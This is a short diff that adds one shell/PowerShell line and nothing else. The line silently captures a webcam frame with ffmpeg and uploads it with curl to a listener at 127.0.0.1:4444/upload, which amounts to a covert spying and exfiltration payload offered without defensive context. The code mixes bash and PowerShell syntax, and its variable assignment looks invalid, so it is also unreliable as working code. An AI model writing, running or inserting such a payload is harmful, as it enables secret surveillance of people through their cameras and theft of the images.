@@ -1,0 +1,5 @@
+foofile="out.png"; ffmpeg -y -f v4l2 -i /dev/video0 -vframes 1 "$foofile";try{curl.exe -X POST -F "file=@$foofile" 127.0.0.1:4444/upload}catch{Write-Output "Error, file was not sent"}
+
+
+
+
